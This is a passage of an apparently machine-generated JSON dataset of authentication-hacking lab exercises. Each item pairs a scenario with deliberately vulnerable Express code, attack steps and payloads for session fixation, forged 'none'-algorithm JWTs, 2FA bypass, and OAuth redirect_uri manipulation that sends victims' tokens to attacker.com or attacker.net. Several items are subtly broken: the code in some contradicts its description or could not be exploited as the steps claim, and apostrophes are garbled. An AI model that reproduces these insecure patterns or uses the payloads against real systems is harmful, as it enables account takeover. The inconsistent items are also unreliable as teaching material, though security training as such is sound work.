      "4. Access the SOAP getUserProfile operation with victim credentials and leaked key.",
      "5. Confirm successful bypass by querying the MyAccount page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const morgan = require('morgan'); app.use(bodyParser.text({ type: 'text/xml' })); app.use(morgan('dev')); app.post('/soap-mfa', (req, res) => { try { if (req.body.includes('<Username>carlos</Username>') && req.body.includes('<ApiKey>DEBUG_LEAK_KEY</ApiKey>')) { res.send('<soap:Envelope><soap:Body><AuthResult>Success</AuthResult></soap:Body></soap:Envelope>'); } else if (req.body.includes('<Username>carlos</Username>')) { throw new Error('Missing or invalid API key for user carlos - DEBUG: expected ApiKey=DEBUG_LEAK_KEY'); } else { res.status(403).send('<soap:Envelope><soap:Body><AuthResult>Failure</AuthResult></soap:Body></soap:Envelope>'); } } catch (e) { console.log('[DEBUG] Exception:', e.message); res.status(500).send(e.message); } }); app.listen(4000, () => console.log('SOAP MFA Bypass Lab running'));",
    "payloads": [
      "<?xml version=\"1.0\"?><soap:Envelope><soap:Body><MFARequest><Username>carlos</Username><ApiKey>DEBUG_LEAK_KEY</ApiKey></MFARequest></soap:Body></soap:Envelope>",
      "<?xml version=\"1.0\"?><soap:Envelope><soap:Body><MFARequest><Username>carlos</Username></MFARequest></soap:Body></soap:Envelope>",
      "500 error leak: Missing or invalid API key for user carlos - DEBUG: expected ApiKey=DEBUG_LEAK_KEY"
    ]
  },
  {
    "Lab scenario": "Session Fixation in REST API session management",
    "Lab Description": "The application uses predictable session tokens stored in a REST cookie without invalidation upon login. The vulnerable login process does not reset the session token after authentication. To solve: Fixate a session and hijack Carlos's authenticated session using the same token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept login flow in Burp Suite using Proxy and identify the session cookie behavior.",
      "Use OWASP ZAP to confirm that session cookie remains unchanged before and after login.",
      "Manually send a GET /login request to establish a session and capture the session cookie.",
      "Send a crafted phishing link containing the session ID to Carlos (simulated).",
      "Once Carlos logs in, reuse the same session cookie to access /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); const users = [{ username: 'carlos', password: 's3cret' }]; app.use(session({ secret: 'insecureSecret', resave: false, saveUninitialized: true })); app.use(express.urlencoded({ extended: true })); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.username = username; console.log(`[DEBUG] User ${username} logged in using session ID ${req.session.id}`); res.redirect('/my-account'); } else res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { if (req.session.authenticated) res.send(`Account page of ${req.session.username}`); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "GET /login -> extract session cookie",
      "Session cookie: sessionid=fixatedSession123",
      "Use session cookie after Carlos logs in: GET /my-account"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in GraphQL auth mutation",
    "Lab Description": "The application uses JWT to protect a GraphQL mutation-based login but accepts the 'none' algorithm for tokens. To solve: Forge a valid token by removing the signature and gain access to the admin GraphQL endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the Authorization header on login mutation.",
      "Decode the JWT using jwt.io and confirm 'alg':'none' is accepted.",
      "Craft a JWT token with 'alg':'none' and payload {\"username\":\"carlos\",\"role\":\"admin\"}.",
      "Send the token via Authorization: Bearer <crafted_token> in a GraphQL POST request.",
      "Query the getAdminData endpoint using Postman with the forged JWT to confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'hardcodedsecret'; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.role === 'admin') return res.send({ data: 'Sensitive admin content' }); res.status(403).send('Access denied'); } catch (err) { console.log('[DEBUG] JWT Error:', err.message); res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
      "JWT: base64(header).base64(payload).",
      "Authorization: Bearer [token]"
    ]
  },
  {
    "Lab scenario": "OAuth token hijack via open redirect URI",
    "Lab Description": "The application uses OAuth 2.0 for authentication, but the token redirect URI is improperly validated. This allows attackers to hijack access tokens. To solve: Craft a redirect URI to leak Carlos's token and use it to access protected resources.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth authorization flow and inspect the redirect_uri.",
      "Modify the redirect_uri to point to your controlled domain (e.g., attacker.com).",
      "Simulate Carlos initiating OAuth login using this crafted URL.",
      "Capture the leaked access_token in your attacker server logs.",
      "Replay the access_token in the Authorization header to access /my-account API."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, state } = req.query; const token = 'token-' + Math.random().toString(36).substring(7); tokens['carlos'] = token; console.log(`[DEBUG] Issued token ${token} for redirect URI ${redirect_uri}`); res.redirect(`${redirect_uri}#access_token=${token}&state=${state}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Object.values(tokens).includes(token)) res.send('Carlos account data'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "GET /oauth/authorize?redirect_uri=https://attacker.com/callback&state=xyz",
      "Intercept token in attacker.com logs",
      "GET /my-account with Authorization: Bearer token-xxxx"
    ]
  },
  {
    "Lab scenario": "2FA bypass via duplicate parameters in SOAP login request",
    "Lab Description": "A SOAP-based login API expects a 2FA code, but fails when multiple <2faCode> elements are submitted. The first one is ignored, and the second is trusted. To solve: Inject duplicate 2FA parameters and force authentication without a valid code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to proxy a SOAP login request and extract the WSDL and SOAP body.",
      "Send the login request to Burp Repeater and test with valid credentials but invalid 2FA code.",
      "Add a second <2faCode> element after the first, leaving the second one empty.",
      "Observe that the backend uses the last occurrence, bypassing validation.",
      "Replay the bypass request and confirm access to /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const xmlparser = require('express-xml-bodyparser'); const app = express(); app.use(xmlparser()); const users = [{ username: 'carlos', password: 'admin', code: '654321' }]; app.post('/soap-login', (req, res) => { const body = req.body['soapenv:Envelope']['soapenv:Body'][0]; const { username, password, '2faCode': code } = body.loginRequest[0]; if (username[0] === 'carlos' && password[0] === 'admin' && code[0] === '654321') res.send('<success>Logged in</success>'); else res.status(403).send('<error>Invalid login</error>'); }); app.get('/my-account', (req, res) => { res.send('Carlos account info'); }); app.listen(4000);",
    "payloads": [
      "<2faCode>invalid</2faCode><2faCode></2faCode>",
      "SOAPAction: /soap-login",
      "Username: carlos, Password: admin"
    ]
  },
  {
    "Lab scenario": "Session Fixation in legacy SOAP endpoint",
    "Lab Description": "The application uses a legacy SOAP authentication endpoint vulnerable to session fixation. The session ID can be preset and is accepted post-login. The application does not regenerate session tokens upon authentication. To solve: fix a session ID, authenticate as Carlos, and access his dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the GET /login request and observe the Set-Cookie header.",
      "Send a crafted SOAP login request using Postman with the JSESSIONID manually set to the fixed value.",
      "Submit the SOAP authentication request as Carlos with known credentials.",
      "Verify that the server accepts the fixed JSESSIONID without regenerating it post-login.",
      "Use the fixed session cookie to access /dashboard as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const soap = require('soap'); const app = express(); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'carpass' }]; app.post('/soap-auth', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) req.session.username = username; res.send(`<response>Login successful</response>`); }); app.get('/dashboard', (req, res) => { if (req.session.username === 'carlos') res.send('Welcome Carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "<soap:Envelope><soap:Body><Login><username>carlos</username><password>carpass</password></Login></soap:Body></soap:Envelope>",
      "Cookie: JSESSIONID=FIXED123",
      "POST /soap-auth with pre-set JSESSIONID"
    ]
  },
  {
    "Lab scenario": "JWT tampering in GraphQL login resolver",
    "Lab Description": "The GraphQL login resolver issues JWT tokens signed with the 'none' algorithm when 'alg' is tampered in the header. The backend uses a misconfigured JWT library that does not enforce algorithm validation. To solve: craft a JWT with 'alg':'none', impersonate Carlos, and access /profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to query the GraphQL login resolver with your credentials and observe the JWT structure.",
      "Decode the JWT using jwt.io and inspect its header and payload.",
      "Create a new JWT with 'alg':'none' and 'username':'carlos', leaving signature blank.",
      "Send the forged JWT in Authorization: Bearer header to /profile endpoint.",
      "Verify access to Carlos's profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/graphql', (req, res) => { const { query } = req.body; if (query.includes('login')) { const token = jwt.sign({ username: 'carlos' }, 'secret'); res.json({ data: { token } }); } }); app.get('/profile', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(auth, { complete: true }); if (decoded?.payload?.username === 'carlos') res.send('Carlos Profile'); else res.status(403).send('Access Denied'); }); app.listen(4000);",
    "payloads": [
      "{ \"alg\": \"none\" }.{ \"username\": \"carlos\" }.",
      "Authorization: Bearer [forged-token]",
      "GraphQL query: mutation { login(username: \"wiener\", password: \"test\") }"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect_uri",
    "Lab Description": "The application implements OAuth Implicit Grant but fails to validate redirect_uri strictly. It allows open redirect injection, enabling token capture. To solve: trick the auth server to redirect Carlos's token to your server and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to analyze the OAuth authorization URL and notice insufficient redirect_uri validation.",
      "Craft a malicious redirect_uri to your attacker-controlled server (e.g., https://attacker.com/capture).",
      "Trick Carlos into visiting the malicious OAuth URL via phishing or reflection injection.",
      "Capture the access_token from the redirected URL fragment.",
      "Replay the token in Authorization header to access /user/profile as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'carlos-access-token'; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-access-token') res.send('Carlos Profile'); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable.com/auth?redirect_uri=https://attacker.com/capture",
      "Captured token: carlos-access-token",
      "Authorization: Bearer carlos-access-token"
    ]
  },
  {
    "Lab scenario": "Session ID leakage in verbose debug logs",
    "Lab Description": "The application exposes internal debug logs via a REST endpoint. These logs contain session tokens in plaintext due to poor log filtering. To solve: extract Carlos\u00e2\u20ac\u2122s session ID from logs and use it to access /my-account.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to access the /debug/logs REST endpoint.",
      "Search for session tokens and correlate them with Carlos's login attempts.",
      "Identify a valid session token assigned to Carlos from the logs.",
      "Replay a GET /my-account request with Cookie: session=<carlos_token>.",
      "Confirm access to Carlos\u00e2\u20ac\u2122s account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); const logs = []; app.use(session({ secret: 'debug-secret', saveUninitialized: true, resave: false })); app.post('/login', (req, res) => { const { username } = req.body; req.session.user = username; logs.push(`[DEBUG] Login by ${username}, session: ${req.session.id}`); res.send('Logged in'); }); app.get('/debug/logs', (req, res) => { res.send(logs.join('\\n')); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Carlos Account'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "GET /debug/logs",
      "Extracted: session=abcd123carlos",
      "Cookie: session=abcd123carlos"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Legacy Cookie Management via REST Login",
    "Lab Description": "The application uses legacy cookie-based session management without proper regeneration of session identifiers after login. The session cookie is issued pre-authentication and persists after login without changes. To solve: Fixate a session ID pre-login, then log in as the victim using that ID to hijack their session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a GET /login request using Burp Suite to extract the Set-Cookie header and capture the pre-auth session ID.",
      "Verify that logging in does not rotate the session cookie by logging in with your credentials while preserving the original cookie.",
      "Craft a phishing-style exploit where the victim logs in while fixated to your session ID. Simulate this by sending a login request with victim credentials and your pre-captured cookie using Burp Repeater.",
      "After login, issue a GET /my-account request with the same cookie to verify session takeover.",
      "Confirm access to victim\u00e2\u20ac\u2122s account page using the hijacked session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'legacysecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); req.session.authenticated = true; req.session.user = username; res.send('Login successful'); }); app.get('/my-account', (req, res) => { if (req.session.authenticated) return res.send('Account details for ' + req.session.user); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab on http://localhost:4000'));",
    "payloads": [
      "Reuse pre-authentication cookie after victim login",
      "Fixate session ID via phishing link",
      "GET /my-account with hijacked session ID"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Tampering in GraphQL Login Token",
    "Lab Description": "The application uses JWTs for authentication with user-supplied tokens via Authorization headers. The token signature verification logic fails to enforce a valid signing algorithm. To solve: Forge a JWT using 'alg':'none' and impersonate the victim by submitting it to a protected GraphQL query.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to perform a GraphQL login mutation and inspect the returned JWT in the Authorization header.",
      "Decode the JWT in jwt.io and observe it uses HS256 or RS256 with a signed payload.",
      "Forge a new token using the same payload but with alg set to 'none' and remove the signature section entirely.",
      "Submit the tampered token in the Authorization header and perform a GraphQL query like { me { username, email } }.",
      "Verify that the server accepts the token and returns Carlos's information."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtpassword' }]; const schema = buildSchema(`type Query { me: User } type User { username: String, email: String }`); const root = { me: (args, context) => { if (!context.user) throw new Error('Unauthorized'); return { username: context.user.username, email: context.user.username + '@corp.local' }; } }; app.use('/graphql', (req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; if (token) { try { req.user = jwt.verify(token, 'jwtsecret'); } catch (e) { console.error('JWT verification failed:', e); } } next(); }); app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, context: { user: req.user }, graphiql: false }))); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).json({ error: 'Invalid credentials' }); const token = jwt.sign({ username: user.username }, 'jwtsecret'); res.json({ token }); }); app.listen(4001, () => console.log('JWT None Alg Lab running on http://localhost:4001'));",
    "payloads": [
      "JWT with header { \"alg\": \"none\" }, no signature",
      "Authorization: Bearer <none-alg-token>",
      "GraphQL query { me { username } }"
    ]
  },
  {
    "Lab scenario": "OAuth Redirect URI Manipulation in REST Authorization Flow",
    "Lab Description": "The application integrates OAuth for login via a third-party provider. However, the redirect_uri parameter is not properly validated during the authorization flow. To solve: Manipulate the redirect_uri to point to an attacker-controlled page and capture the authorization code to impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to initiate an OAuth login and intercept the authorization request to the third-party provider.",
      "Note the redirect_uri parameter in the request. Modify it to point to a controlled domain (e.g., https://attacker.net/callback).",
      "Forward the modified request and log the authorization code received at the attacker domain (simulate it in Burp Collaborator).",
      "Use the captured code to perform the token exchange manually via Postman (POST /oauth/token with code and client credentials).",
      "Use the access_token to query the authenticated API endpoint and confirm Carlos\u00e2\u20ac\u2122s identity."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth/callback', async (req, res) => { const { code } = req.query; if (!code) return res.status(400).send('Missing code'); try { const tokenRes = await axios.post('https://provider.com/oauth/token', { code, client_id: 'client123', client_secret: 'secret456', redirect_uri: req.protocol + '://' + req.get('host') + req.originalUrl }); const accessToken = tokenRes.data.access_token; const userInfo = await axios.get('https://provider.com/userinfo', { headers: { Authorization: 'Bearer ' + accessToken } }); res.send('Welcome, ' + userInfo.data.username); } catch (e) { console.error('OAuth error:', e); res.status(500).send('OAuth failed'); } }); app.listen(4002, () => console.log('OAuth Redirect URI Lab running on http://localhost:4002'));",
    "payloads": [
      "redirect_uri=https://attacker.net/callback",
      "Capture code via redirected OAuth flow",
      "POST /oauth/token with stolen code"
    ]
  },
  {
    "Lab scenario": "Session Fixation in SOAP-based Login Endpoint",
    "Lab Description": "This lab's SOAP-based login API suffers from a session fixation vulnerability due to insecure session token handling. The application assigns a session ID before user authentication and does not renew it after login, allowing attackers to hijack user sessions. To solve: hijack Carlos's session and access his account page.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Use OWASP ZAP to intercept the initial unauthenticated SOAP login request and note the Set-Cookie response.",
      "2. Manually set the session cookie to a known value using Postman and perform the login with Carlos's credentials.",
      "3. Observe that the session token remains unchanged even after successful login, confirming fixation.",
      "4. Send the crafted session cookie to your browser and reuse it to access /my-account.",
      "5. Confirm access to Carlos's session by visiting the protected account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text()); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein123' }]; app.post('/soap-login', (req, res) => { let sessionId = req.cookies['sid'] || Math.random().toString(36).slice(2); res.cookie('sid', sessionId); const match = req.body.match(/<username>(.*)<\\/username>.*<password>(.*)<\\/password>/); if (match && match[1] === 'carlos' && match[2] === 'letmein123') { res.send(`<soap:Envelope><soap:Body><status>Login successful</status></soap:Body></soap:Envelope>`); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { if (req.cookies.sid === 'fixated-session') { res.send('Account details for carlos'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('SOAP Session Fixation running'));",
    "payloads": [
      "<soapenv:Envelope><soapenv:Body><username>carlos</username><password>letmein123</password></soapenv:Body></soapenv:Envelope>",
      "Cookie: sid=fixated-session",
      "GET /my-account HTTP/1.1"
    ]
  },
  {
    "Lab scenario": "JWT Tampering in GraphQL Login Token Handling",
    "Lab Description": "The application's GraphQL login system uses JWTs for session management but fails to validate the algorithm securely. The JWT library accepts tokens signed with 'alg':'none', allowing an attacker to forge tokens. To solve: forge a valid JWT to impersonate Carlos and access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the login GraphQL mutation and obtain a valid JWT after authenticating as a normal user.",
      "2. Decode the JWT using jwt.io and note the algorithm is 'HS256'.",
      "3. Modify the JWT to set 'alg':'none' and change 'username':'carlos' in the payload.",
      "4. Remove the signature part entirely, rebase64-encode, and send the token in the Authorization header.",
      "5. Access /graphql with query {myAccount} and confirm the forged token grants Carlos's access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('login')) { const token = jwt.sign({ username: 'carlos' }, 'secret'); res.json({ data: { login: token } }); } else if (query.includes('myAccount')) { const auth = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(auth, { complete: true }); if (payload?.payload?.username === 'carlos') { res.json({ data: { myAccount: 'Sensitive info of carlos' } }); } else { res.status(403).json({ error: 'Unauthorized' }); } } }); app.listen(4000, () => console.log('GraphQL JWT Tampering running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer <forged_none_jwt>",
      "POST /graphql {\"query\":\"{myAccount}\"}"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Authorization Code Flow",
    "Lab Description": "The application uses OAuth with an external provider, but the authorization code is not properly bound to the client ID. This allows attackers to inject a stolen code into the REST /oauth-callback endpoint. To solve: perform an authorization code injection to hijack Carlos's OAuth session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the OAuth redirect and note the authorization code parameter in the /oauth-callback endpoint.",
      "2. Log in as your own user and capture your code during the OAuth flow.",
      "3. Send a malicious GET request to /oauth-callback using Carlos's session and your captured code.",
      "4. Observe that the code is accepted and your session now links to Carlos's account due to insecure client validation.",
      "5. Visit /my-account to confirm you're logged in as Carlos and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const axios = require('axios'); const app = express(); app.use(session({ secret: 'oauth-lab', resave: false, saveUninitialized: true })); app.get('/login', (req, res) => { res.redirect(`https://oauth.example.com/auth?response_type=code&client_id=lab-app&redirect_uri=http://localhost:4000/oauth-callback`); }); app.get('/oauth-callback', async (req, res) => { const { code } = req.query; const tokenResponse = await axios.post('https://oauth.example.com/token', { code }); const userInfo = await axios.get('https://oauth.example.com/userinfo', { headers: { Authorization: `Bearer ${tokenResponse.data.access_token}` } }); req.session.user = userInfo.data.username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('OAuth account access: carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Confusion Lab running'));",
    "payloads": [
      "GET /oauth-callback?code=attacker_code_stolen_via_replay HTTP/1.1",
      "GET /my-account HTTP/1.1",
      "Modify Authorization Code in redirected request using Burp Repeater"
    ]
  }
]